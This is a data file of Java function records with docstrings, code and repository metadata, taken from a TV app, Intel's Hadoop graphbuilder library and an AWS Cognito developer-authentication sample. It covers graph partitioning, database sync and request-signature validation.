{"docstring": "// \u7f51\u4e0a\u7528\u6237id\u6570\u636e\u548c\u672c\u5730\u7528\u6237id\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\n// \u4ee5\u7f51\u4e0a\u6570\u636e\u4e3a\u6807\u51c6\uff0c\u5982\u679c\u672c\u5730\u7528\u6237id\u6570\u636e\u591a\u4f59\u7684\u5c31\u5220\u9664\uff0c\u4e0d\u5b58\u5728\u7684\u5c31\u8fdb\u884c\u6dfb\u52a0\n", "func_signal": "private void compareUsrHis4DB(List<HotItemInfo> list, String userId)", "code": "{\n\t\n\tif (list == null) {\n\n\t\treturn;\n\t}\n\t\n\tString selection = UserShouCang.USER_ID + \"=?\";// \u901a\u8fc7\u7528\u6237id\uff0c\u627e\u5230\u76f8\u5e94\u4fe1\u606f\n\tString[] selectionArgs = { userId };\n\n\tTvDatabaseHelper helper = TvDatabaseHelper\n\t\t\t.newTvDatabaseHelper(getApplicationContext());\n\tSQLiteDatabase database = helper.getWritableDatabase();// \u83b7\u53d6\u5199db\n\t\n\tString[] columns = { UserHistory.PRO_ID};// \u8fd4\u56de\u5f71\u7247id\n\t\n\tCursor cursor_proId = database.query(\n\t\t\tTvDatabaseHelper.HISTORY_TABLE_NAME, columns, selection,\n\t\t\tselectionArgs, null, null, null);\n\t\n\tif (list.size() > 0) {// \u5f53\u7528\u6237\u6709\u5386\u53f2\u8bb0\u5f55\u65f6\n\t\t\n\t\tif (cursor_proId != null && cursor_proId.getCount() > 0) {// \u6570\u636e\u5e93\u6709\u6570\u636e\n\t\t\t\n\t\t\tdatabase.delete(TvDatabaseHelper.HISTORY_TABLE_NAME, selection,\n\t\t\t\t\tselectionArgs);\n\t\t\t\n\t\t}\n\t\t\n\t\tfor(HotItemInfo info:list) {\n\t\t\t\n\t\t\tDBUtils.insertHotItemInfo2DB_History(getApplicationContext(),\n\t\t\t\t\tinfo, userId, database);\n\t\t}\n\t\t\n\t}else {// \u5982\u679c\u7f51\u4e0a\u6b64\u7528\u6237\u6ca1\u6709\u4efb\u4f55\u6536\u85cf,\u4f46\u662f\u6570\u636e\u5e93\u4e2d\u6709\u76f8\u5e94\u7528\u6237\u6570\u636e\uff0c\u6e05\u7a7a\u6389\u6b64\u7528\u6237\u6570\u636e\n\n\t\tif (cursor_proId != null && cursor_proId.getCount() > 0) {// \u6570\u636e\u5e93\u6709\u6570\u636e\n\n\t\t\tdatabase.delete(TvDatabaseHelper.HISTORY_TABLE_NAME, selection,\n\t\t\t\t\tselectionArgs);\n\t\t}\n\t}\n\t\n\tcursor_proId.close();\n\thelper.close();\n\t\n}", "path": "joytv\\src\\com\\joyplus\\tv\\Main1.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Initialize as a VertexRecord value without vertex data.\n * \n * @param vid\n * @param pid\n * @param inEdges\n * @param outEdges\n */\n", "func_signal": "public void initVrecValue(VidType vid, short pid, int inEdges, int outEdges)", "code": "{\n  this.flag = VRECORDVALUE;\n  this.vrecordValue = new CombinedVrecordValueType(vid, pid, inEdges,\n      outEdges, getGraphTypeFactory());\n  this.edgeValue = null;\n\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\keyvalue\\IngressValueType.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Initialize the EdgeRecord value.\n * \n * @param pid\n * @param source\n * @param target\n * @param edata\n */\n", "func_signal": "public void initEdgeValue(short pid, VidType source, VidType target,\n    EdgeData edata)", "code": "{\n  this.flag = EDGEVALUE;\n  this.edgeValue = new CombinedEdgeValueType(source, target, edata,\n      getGraphTypeFactory());\n  this.vrecordValue = null;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\keyvalue\\IngressValueType.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Load the dictionary partition with the current dictionaryId.\n * \n * @throws IOException\n */\n", "func_signal": "private void loadDictionary() throws IOException", "code": "{\n  dict.clear();\n  String prefix = \"vidhashmap\" + dictionaryId;\n  FileStatus[] stats = fs.listStatus(new Path(dictionaryPath));\n  for (FileStatus stat : stats) {\n    if (stat.getPath().getName().matches(\".*\" + prefix + \"-r-.*\")) {\n      LOG.debug((\"Mapper Load dictionary: \" + stat.getPath().getName()));\n      Scanner sc = new Scanner(new BufferedReader(new InputStreamReader(\n          fs.open(stat.getPath()))));\n      while (sc.hasNextLine()) {\n        String line = sc.nextLine();\n        StringTokenizer tokenizer = new StringTokenizer(line);\n        try {\n          long id = Long.valueOf(tokenizer.nextToken());\n          VidType rawid = vidparser.getValue(tokenizer.nextToken());\n          dict.put(rawid, Long.valueOf(id));\n        } catch (NoSuchElementException e) {\n          e.printStackTrace();\n          LOG.error(\"Error in loading vidmap entry:\" + line);\n        }\n      }\n    }\n  }\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\idnormalize\\mapreduce\\TransEdgeMapper.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * @param numChunks\n *          number of partitions in the dictionary.\n * @param dictionaryPath\n *          path of the partitioned dictionary.\n * @param graphparser\n * @param vidparser\n * @param edataparser\n */\n", "func_signal": "public TransEdgeMR(int numChunks, String dictionaryPath,\n    GraphParser graphparser, FieldParser vidparser, FieldParser edataparser)", "code": "{\n  this.numChunks = numChunks;\n  this.graphparser = graphparser;\n  this.vidparser = vidparser;\n  this.edataparser = edataparser;\n  this.dictionaryPath = dictionaryPath;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\idnormalize\\mapreduce\\TransEdgeMR.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * @param args\n *          [inputPath, outputPath, optionalDictionaryPath]\n * @throws CannotCompileException\n * @throws NotFoundException\n * @throws ParserConfigurationException\n * @throws IOException \n */\n", "func_signal": "public static void main(String[] args) throws CannotCompileException,\n    NotFoundException, ParserConfigurationException, IOException", "code": "{\n  Job job = new CreateLinkGraph().new Job();\n  String wikiinput = args[0];\n  String graphoutput = args[1];\n\n  GraphTokenizer tokenizer = new LinkGraphTokenizer();\n  InputFormat format = new WikiPageInputFormat();\n\n  LOG.info(\"========== Creating Graph ================\");\n  job.run(tokenizer, format, new String[] { wikiinput }, graphoutput);\n  LOG.info(\"========== Done creating graph ================\");\n}", "path": "demoapps\\com\\intel\\hadoop\\graphbuilder\\demoapps\\wikipedia\\linkgraph\\CreateLinkGraph.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Reduce a list of EdgeValues into a graph and output the graph.\n * \n * @param pid\n * @param iter\n * @param out\n * @param reporter\n * @throws Exception\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\nprotected void reduceEdge(int pid, Iterator<ValueType> iter,\n    OutputCollector<Text, Text> out, Reporter reporter) throws Exception", "code": "{\n\n  // Switch to GLGraph by uncommenting the next line.\n  // myGraph = new GLGraph<VidType, VertexData, EdgeData>();\n  myGraph = new SimpleSubGraph<VidType, VertexData, EdgeData>();\n  myGraph.setPid(pid / subpartPerPartition);\n  ((SimpleSubGraph) myGraph).setSubPid(pid % subpartPerPartition);\n\n  LOG.info(\"Reduce edges for graph: \" + pid);\n  while (iter.hasNext()) {\n    ValueType val = iter.next();\n    CombinedEdgeValueType evalue = val.edgeValue();\n    myGraph.addEdges(evalue.sources(), evalue.targets(), evalue.edata());\n  }\n\n  // Switch to GLGraph by uncommenting the next line.\n  // GLJsonFormatter formatter = new GLJsonFormatter();\n  SimpleJsonFormatter formatter = new SimpleJsonFormatter();\n  LOG.info(\"Write out graph \" + pid + \" with \" + myGraph.numEdges()\n      + \" edges\");\n  graphOutput.writeAndClear(myGraph, formatter, out, reporter);\n\n  LOG.info(\"Done reducing graph:\" + pid + \".\");\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\edge\\EdgeIngressReducer.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Reduce a list of values. Value\n * \n * @param flag\n * @param iter\n */\n", "func_signal": "public void reduce(short flag,\n    Iterator<IngressValueType<VidType, VertexData, EdgeData>> iter)", "code": "{\n  if (flag == IngressKeyType.EDGEKEY) {\n    edgeValue = new CombinedEdgeValueType(getGraphTypeFactory());\n    while (iter.hasNext()) {\n      IngressValueType<VidType, VertexData, EdgeData> next = iter.next();\n      edgeValue.add(next.edgeValue());\n      CombinedEdgeValueType eval = next.edgeValue();\n    }\n    this.flag = EDGEVALUE;\n  } else if (flag == IngressKeyType.VERTEXKEY) {\n    vrecordValue = new CombinedVrecordValueType(getGraphTypeFactory());\n    while (iter.hasNext()) {\n      IngressValueType<VidType, VertexData, EdgeData> next = iter.next();\n      vrecordValue.add(next.vrecordValue());\n    }\n    this.flag = VRECORDVALUE;\n  } else {\n    LOG.error(\"Unknown Ingress Key Type: \" + flag);\n  }\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\keyvalue\\IngressValueType.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Clear the edgevalue and vrecordvalue.\n */\n", "func_signal": "public void clear()", "code": "{\n  if (flag == EDGEVALUE) {\n    edgeValue.clear();\n  } else if (flag == VRECORDVALUE) {\n    vrecordValue.clear();\n  } else {\n\n  }\n  edgeValue = null;\n  vrecordValue = null;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\keyvalue\\IngressValueType.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Set an edge with given source target ids and edge data, overwriting\n * exisiting fields.\n * \n * @param source\n * @param target\n * @param edata\n */\n", "func_signal": "public void set(VidType source, VidType target, EdgeData edata)", "code": "{\n  this.source = source;\n  this.target = target;\n  this.edata = edata;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\graph\\Edge.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Reap the threads.\n */\n", "func_signal": "public void close()", "code": "{\n  forPool.shutdown();\n  while (!forPool.isTerminated()) {\n  }\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\util\\Parallel.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/** Default constructor. Creates an empty edge list. */\n", "func_signal": "public EdgeList()", "code": "{\n  this.store = null;\n  this.begin = -1;\n  this.end = -1;\n  this.dir = EdgeType.DIR.EMPTY;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\graph\\glgraph\\EdgeList.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Initialize as a VertexRecord value with vdata.\n * \n * @param vid\n * @param vdata\n */\n", "func_signal": "public void initVrecValue(VidType vid, VertexData vdata)", "code": "{\n  this.flag = VRECORDVALUE;\n  this.vrecordValue = new CombinedVrecordValueType(vid, vdata);\n  this.edgeValue = null;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\keyvalue\\IngressValueType.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Update the tracking table by adding the new assignment of pid to vid.\n * \n * @param vid\n * @param pid\n */\n", "func_signal": "private void setVertexPresence(VidType vid, short pid)", "code": "{\n  if (vertexPresence.containsKey(vid)) {\n    BitSet bitset = vertexPresence.get(vid);\n    if (!bitset.get(pid)) {\n      bitset.set(pid);\n    }\n  } else {\n    BitSet bitset = new BitSet(numProcs);\n    bitset.set(pid);\n    vertexPresence.put(vid, bitset);\n  }\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\strategy\\GreedyIngress.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Reduce a list of VertexRecordValues and the Vertex Data into a vertex\n * record.\n *\n * @param pid\n * @param iter\n * @param reporter\n */\n", "func_signal": "protected void reduceVertex(VidType vid, Iterator<ValueType> iter,\n    Reporter reporter)", "code": "{\n  vrecord = new VertexRecord<VidType, VertexData>(vid);\n\n  BitSet mirrors = new BitSet(numProcs);\n  int inEdges = 0;\n  int outEdges = 0;\n    \n  while (iter.hasNext()) {\n    ValueType val = iter.next();\n\n    CombinedVrecordValueType vrecordValue = val.vrecordValue();\n    inEdges += vrecordValue.inEdges();\n    outEdges += vrecordValue.outEdges();\n    HashSet<Short> pids = vrecordValue.pids();\n    Iterator<Short> piditer = pids.iterator();\n    while (piditer.hasNext()) {\n      mirrors.set(piditer.next());\n    }\n\n    vrecord.setMirrors(mirrors);\n    vrecord.setInEdges(inEdges);\n    vrecord.setOutEdges(outEdges);\n\n    // merge vdata\n    if (vrecordValue.hasVdata()) {\n      if (vrecord.vdata() == null)\n        vrecord.setVdata((VertexData) vrecordValue.vdata());\n      else if (vrecord.vdata() instanceof Mergable) {\n        ((Mergable) vrecord.vdata()).add(vrecordValue.vdata());\n      }\n    }\n  }\n\n  // Set owner\n  Random generator = new Random();\n  if (vrecord.numMirrors() == 0) {\n    vrecord.setOwner((short) generator.nextInt(numProcs));\n  } else {\n    List<Short> mirrorsList = vrecord.mirrorList();\n    vrecord.setOwner(mirrorsList.get(generator.nextInt(mirrorsList.size())));\n    vrecord.removeMirror(vrecord.owner());\n  }\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\mapreduce\\edge\\EdgeIngressReducer.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * @param args\n *          [inputpath, outputpath]\n * @throws CannotCompileException\n * @throws IllegalAccessException\n * @throws InstantiationException\n * @throws NotFoundException\n */\n", "func_signal": "public static void main(String[] args) throws NotFoundException,\n    InstantiationException, IllegalAccessException, CannotCompileException", "code": "{\n  String input = args[0];\n  String output = args[1];\n\n  EdgeTransformJobTest test = new EdgeTransformJobTest();\n  Job job = test.new Job();\n  job.run(EdgeTransformMR.SOURCE, input, output);\n}", "path": "test\\com\\intel\\hadoop\\graphbuilder\\test\\job\\EdgeTransformJobTest.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Computes the \"optimal\" assignment of the edge by choosing the partition\n * such that the vertex mirror size is the smallest. Break ties by choosing\n * the assignment that keeps the best load balance among all partitions.\n * \n * @param source\n * @param target\n * @return\n */\n", "func_signal": "private short getPid(VidType source, VidType target)", "code": "{\n  double epsilon = this.threshold;\n  ArrayList<Double> scores = new ArrayList<Double>(Collections.nCopies(\n      numProcs, 0.0));\n  int minEdges = java.util.Collections.min(procLoad);\n  int maxEdges = java.util.Collections.max(procLoad);\n  BitSet sourceTable = (vertexPresence.containsKey(source)) ? vertexPresence\n      .get(source) : new BitSet(numProcs);\n  BitSet targetTable = (vertexPresence.containsKey(target)) ? vertexPresence\n      .get(target) : new BitSet(numProcs);\n\n  for (int j = 0; j < numProcs; j++) {\n    double bal = (double) (maxEdges - procLoad.get(j))\n        / (maxEdges - minEdges + epsilon);\n    int sourceScore = (sourceTable.get(j) || (useHash && source.hashCode()\n        % numProcs == j)) ? 1 : 0;\n    int targetScore = (targetTable.get(j) || (useHash && target.hashCode()\n        % numProcs == j)) ? 1 : 0;\n    scores.set(j, bal + sourceScore + targetScore);\n  }\n\n  double maxScore = java.util.Collections.max(scores);\n  ArrayList<Short> bestProcs = new ArrayList<Short>();\n  for (int j = 0; j < numProcs; j++) {\n    if (Math.abs(scores.get(j) - maxScore) < 1e-5) {\n      bestProcs.add((short) j);\n    }\n  }\n\n  Random generator = new Random();\n  short pid = bestProcs.get(generator.nextInt(bestProcs.size()));\n  procLoad.set(pid, procLoad.get(pid) + 1);\n  return pid;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\partition\\strategy\\GreedyIngress.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * @param args\n * @throws IOException\n * @throws IllegalAccessException\n * @throws InstantiationException\n * @throws ParserConfigurationException\n * @throws NotFoundException\n * @throws CannotCompileException\n */\n", "func_signal": "public static void main(String[] args) throws IOException,\n    InstantiationException, IllegalAccessException, CannotCompileException,\n    NotFoundException, ParserConfigurationException", "code": "{\n\n  int npart = Integer.parseInt(args[0]);\n  String rawinput = args[1];\n  String output = args[2];\n\n  String rawgraph = output + \"/graph_raw\";\n  String tfidfgraph = output + \"/graph_tfidf\";\n  String normedgraph = output + \"/graph_norm\";\n  String partitionedgraph = output + \"/graph_partitioned\";\n\n  Timer timer = new Timer();\n  timer.start();\n\n\n  try {\n  if (args.length > 3) {\n    String dict = args[3];\n    new CreateWordCountGraph()\n        .main(new String[] { rawinput, rawgraph, dict });\n  } else {\n    new CreateWordCountGraph().main(new String[] { rawinput, rawgraph });\n  }\n\n  LOG.info(\"Create graph finished in : \" + timer.time_since_last()\n      + \" seconds\");\n\n\n  } catch (Exception e) {\n    e.printStackTrace();\n    return;\n  }\n\n  try {\n    new TransformToTFIDF().main(new String[] { String.valueOf(30000), rawgraph,\n        tfidfgraph });\n    LOG.info(\"Transform TFIDF finished in : \" + timer.time_since_last()\n      + \" seconds\");\n  } catch (Exception e) {\n    e.printStackTrace();\n    return;\n  }\n\n  try {\n  new NormalizeGraphIds().main(new String[] { tfidfgraph, normedgraph });\n\n  LOG.info(\"Normalize graph finished in : \" + timer.time_since_last()\n      + \" seconds\");\n  } catch (Exception e) {\n    e.printStackTrace();\n    return;\n  }\n\n  try {\n    new PartitionGraph().main(new String[] { String.valueOf(npart),\n      normedgraph, partitionedgraph });\n\n    LOG.info(\"Partition graph finished in : \" + timer.time_since_last()\n      + \" seconds\");\n  } catch (Exception e) {\n    e.printStackTrace();\n    return;\n  }\n\n  LOG.info(\"Total flow time : \" + timer.current_time() + \" seconds\");\n}", "path": "demoapps\\com\\intel\\hadoop\\graphbuilder\\demoapps\\wikipedia\\docwordgraph\\TFIDFGraphEnd2End.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Creates an edge with given source, target and edge data.\n * \n * @param source\n * @param target\n * @param edata\n */\n", "func_signal": "public Edge(VidType source, VidType target, EdgeData edata)", "code": "{\n  this.source = source;\n  this.target = target;\n  this.edata = edata;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\graph\\Edge.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/** This function is taken and modified from wikixmlj WikiTextParser */\n", "func_signal": "private void parseLinks(String text)", "code": "{\n  links.clear();\n  Pattern catPattern = Pattern\n      .compile(\"\\\\[\\\\[(.*?)\\\\]\\\\]\", Pattern.MULTILINE);\n  Matcher matcher = catPattern.matcher(text);\n  while (matcher.find()) {\n    String[] temp = matcher.group(1).split(\"\\\\|\");\n    if (temp == null || temp.length == 0)\n      continue;\n    String link = temp[0];\n    if (!link.replaceAll(\"\\\\s\", \"\").isEmpty() && !link.contains(\":\")) {\n      links.add(link.replaceAll(\"\\\\s\", \"_\"));\n    }\n  }\n}", "path": "demoapps\\com\\intel\\hadoop\\graphbuilder\\demoapps\\wikipedia\\linkgraph\\LinkGraphTokenizer.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * Construct an EdgeList containing all edges in the {@code SparseGraphStruct}\n * that are incoming (outgoing) edges with respect to the given vertex. The\n * direction is determined by the parameter {@code dir}.\n * \n * @param vid\n *          the center vertex id.\n * @param store\n *          the backend storage of all edges.\n * @param dir\n *          the direction of edges with respect to the center vertex.\n */\n", "func_signal": "public EdgeList(int vid, SparseGraphStruct store, EdgeType.DIR dir)", "code": "{\n  this.store = store;\n  this.center = vid;\n  this.begin = store.begin(vid);\n  this.end = store.end(vid);\n  this.dir = dir;\n}", "path": "src\\com\\intel\\hadoop\\graphbuilder\\graph\\glgraph\\EdgeList.java", "repo_name": "intel/graphbuilder", "stars": 95, "license": "apache-2.0", "language": "java", "size": 4937}
{"docstring": "/**\n * This method regenerates the key each time. It lookups up device details\n * of a registered device. Also registers device if it is not already\n * registered.\n * \n * @param uid\n *            Unique device identifier\n * @param username\n *            Userid of the current user\n * @return device info i.e. key and userid\n * @throws DataAccessException\n */\n", "func_signal": "private DeviceInfo regenerateKey(String uid, String username)\n        throws DataAccessException", "code": "{\n    log.info(\"Generating encryption key\");\n    String encryptionKey = Utilities.generateRandomString();\n\n    if (deviceAuthenticator.registerDevice(uid, encryptionKey, username)) {\n        return deviceAuthenticator.getDeviceInfo(uid);\n    }\n\n    return null;\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\AWSCognitoDeveloperAuthenticationSample.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Get the logger for AWSCognitoDeveloperAuthenticationSample\n */\n", "func_signal": "public synchronized static Logger getLogger()", "code": "{\n    if (null != logger) {\n        return logger;\n    }\n\n    logger = Logger.getLogger(\"AWSCognitoDeveloperAuthenticationSampleLogger\");\n    FileHandler handler;\n    try {\n        handler = new FileHandler(\"MyLogFile.txt\", true);\n\n        SimpleFormatter formatter = new SimpleFormatter();\n        handler.setFormatter(formatter);\n\n        logger.addHandler(handler);\n        logger.setLevel(Level.ALL);\n\n    } catch (IOException e) {\n        throw new RuntimeException(\"Failed to initialize logger. Aborting.\", e);\n    }\n\n    return logger;\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\AWSCognitoDeveloperAuthenticationSampleLogger.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Store the username, password combination in the Identity table. The\n * username will represent the item name and the item will contain a\n * attributes password and userid.\n * \n * @param username\n *            Unique user identifier\n * @param password\n *            user password\n * @param uri\n *            endpoint URI\n */\n", "func_signal": "protected void storeUser(String username, String password, String uri) throws DataAccessException", "code": "{\n    if (null == username || null == password) {\n        return;\n    }\n\n    String hashedSaltedPassword = Utilities.getSaltedPassword(username, uri, password);\n\n    Map<String, AttributeValue> item = new HashMap<String, AttributeValue>();\n    item.put(ATTRIBUTE_USERNAME, new AttributeValue().withS(username));\n    item.put(ATTRIBUTE_HASH_SALTED_PASSWORD, new AttributeValue().withS(hashedSaltedPassword));\n    item.put(ATTRIBUTE_ENABLED, new AttributeValue().withS(\"true\"));\n\n    PutItemRequest putItemRequest = new PutItemRequest()\n            .withTableName(USER_TABLE)\n            .withItem(item);\n    try {\n        ddb.putItem(putItemRequest);\n    } catch (AmazonClientException e) {\n        throw new DataAccessException(\"Failed to store user: \" + username, e);\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\UserAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Verify if the given signature is valid.\n * \n * @param stringToSign\n *            The string to sign\n * @param key\n *            The key used in the signature process\n * @param signature\n *            Base64 encoded HMAC-SHA256 signature derived from key and\n *            string\n * @return true if computed signature matches with the given signature,\n *         false otherwise\n */\n", "func_signal": "public boolean validateSignature(String stringToSign, String key, String targetSignature)", "code": "{\n    String computedSignature = Utilities.sign(stringToSign, key);\n    return Utilities.slowStringComparison(targetSignature, computedSignature);\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\AWSCognitoDeveloperAuthenticationSample.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Verify if the token request is valid. UID is authenticated. The timestamp\n * is checked to see it falls within the valid timestamp window. The\n * signature is computed and matched against the given signature. Useful in\n * Anonymous and Identity modes\n * \n * @param uid\n *            Unique device identifier\n * @param signature\n *            Base64 encoded HMAC-SHA256 signature derived from key and\n *            timestamp\n * @param timestamp\n *            Timestamp of the request in ISO8601 format\n * @throws DataAccessException\n * @throws UnauthorizedException\n */\n", "func_signal": "public void validateTokenRequest(String uid, String signature, String timestamp, \n        String stringToSign) throws DataAccessException, UnauthorizedException", "code": "{\n    if (!Utilities.isTimestampValid(timestamp)) {\n        throw new UnauthorizedException(\"Invalid timestamp: \" + timestamp);\n    }\n    log.info(String.format(\"Timestamp [ %s ] is valid\", timestamp));\n\n    DeviceInfo device = deviceAuthenticator.getDeviceInfo(uid);\n    if (device == null) {\n        throw new UnauthorizedException(\"Couldn't find device: \" + uid);\n    }\n\n    if (!validateSignature(stringToSign, device.getKey(), signature)) {\n        log.info(\"String to sign: \" + stringToSign);\n        throw new UnauthorizedException(\"Invalid signature: \" + signature);\n    }\n    log.info(\"Signature matched!!!\");\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\AWSCognitoDeveloperAuthenticationSample.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Returns the list of usernames stored in the identity table.\n * \n * @return list of existing usernames in DynamoDB table\n */\n", "func_signal": "public List<String> listUsers()", "code": "{\n    List<String> users = new ArrayList<String>(1000);\n\n    ScanResult result = ddb.scan(new ScanRequest().withTableName(USER_TABLE).withLimit(1000));\n\n    for (Map<String, AttributeValue> item : result.getItems()) {\n        String s = \"\";\n\n        for (Entry<String, AttributeValue> entry : item.entrySet()) {\n            s += \" ** \" + entry.getKey() + \" = \" + entry.getValue().getS();\n        }\n\n        users.add(s);\n    }\n\n    return users;\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\UserAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Generate key for device UID. The key is encrypted by hash of salted\n * password of the user. Encrypted key is then wrapped in JSON object before\n * returning it. This function is useful in Identity mode\n * \n * @param username\n *            Unique user identifier\n * @param uid\n *            Unique device identifier\n * @return encrypted key as JSON object\n * @throws DataAccessException\n * @throws UnauthorizedException\n */\n", "func_signal": "public String getKey(String username, String uid) throws DataAccessException, UnauthorizedException", "code": "{\n    DeviceInfo device = deviceAuthenticator.getDeviceInfo(uid);\n    if (device == null) {\n        throw new UnauthorizedException(\"Couldn't find device: \" + uid);\n    }\n\n    UserInfo user = userAuthenticator.getUserInfo(username);\n    if (user == null) {\n        throw new UnauthorizedException(\"Couldn't find user: \" + username);\n    }\n\n    log.info(\"Responding with encrypted key for UID : \" + uid);\n    return Utilities.prepareJsonResponseForKey(device.getKey(), user.getHashedPassword());\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\AWSCognitoDeveloperAuthenticationSample.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Checks to see if the request has valid timestamp. If given timestamp\n * falls in 30 mins window from current server timestamp\n */\n", "func_signal": "public static boolean isTimestampValid(String timestamp)", "code": "{\n    long timestampLong = 0L;\n    final long window = 15 * 60 * 1000L;\n\n    if (null == timestamp) {\n        return false;\n    }\n\n    timestampLong = DateUtils.parseISO8601Date(timestamp).getTime();\n    \n    Long now = new Date().getTime();\n\n    long before15Mins = new Date(now - window).getTime();\n    long after15Mins = new Date(now + window).getTime();\n\n    return (timestampLong >= before15Mins && timestampLong <= after15Mins);\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\Utilities.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Deletes the specified UID from the identity table.\n * \n * @param uid\n *            Unique device identifier\n */\n", "func_signal": "public void deleteDevice(String uid) throws DataAccessException", "code": "{\n    HashMap<String, AttributeValue> key = new HashMap<String, AttributeValue>();\n    key.put(ATTRIBUTE_UID, new AttributeValue().withS(uid));\n\n    DeleteItemRequest deleteItemRequest = new DeleteItemRequest()\n            .withTableName(DEVICE_TABLE)\n            .withKey(key);\n\n    try {\n        ddb.deleteItem(deleteItemRequest);\n    } catch (AmazonClientException e) {\n        throw new DataAccessException(\"Failed to delete device: \" + uid, e);\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\DeviceAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
